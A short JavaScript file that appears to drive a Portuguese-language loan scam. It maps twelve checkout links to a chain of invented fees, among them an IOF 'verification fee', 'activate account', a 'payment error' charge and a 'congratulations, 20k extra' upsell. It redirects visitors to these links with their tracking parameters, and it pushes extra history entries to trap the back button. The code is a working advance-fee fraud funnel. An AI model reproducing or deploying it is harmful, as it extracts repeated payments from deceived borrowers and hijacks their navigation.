const baseLinks = {
    up1: "https://pay.pagsuper.online/c/5b808542-80eb-48f6-9641-e41ee0eb3899", // IOF
    up2: "https://pay.pagsuper.online/c/1b2d7861-b4d0-4c6e-9633-a924bfee81ad", // Taxa de verificação de IOF
    up3: "https://pay.pagsuper.online/c/0e2709c3-7eeb-4fa5-8069-1060e10cdddc", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://pay.pagsuper.online/c/1f221d1e-d7c0-4df8-aab4-f7afb7f99e07", // NFe
    up5: "https://pay.pagsuper.online/c/f73d8d07-b711-4b8a-b61a-d265c57cdd45", // Ativar conta
    up6: "https://pay.pagsuper.online/c/8e8c94b5-c813-4f98-b195-e25a693a462a", // Taxa de registro do contrato
    up7: "https://pay.pagsuper.online/c/de688047-3276-4a0d-bdf2-fc34e103ddeb", // Parabéns, 20k adicional
    up8: "https://pay.pagsuper.online/c/622c4bd8-d3cd-4c8a-90f3-2a128a50e4f2", // Erro no pagamento - 14,06
    up9: "https://pay.pagsuper.online/c/b0229ef7-3d2f-4ad8-8423-43dc159818c6", // APP - 11,99
    up10:"https://pay.pagsuper.online/c/f460cb34-8c09-46d3-a7b6-39c17caf9513", // Taxa de Abertura TAC - 16,92
    up11:"https://pay.pagsuper.online/c/03536b57-ab68-4544-8f3f-0b5ef8825ebb", // Taxa de Consultoria Financeira - 19,53
    up12:"https://pay.pagsuper.online/c/03536b57-ab68-4544-8f3f-0b5ef8825ebb" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);

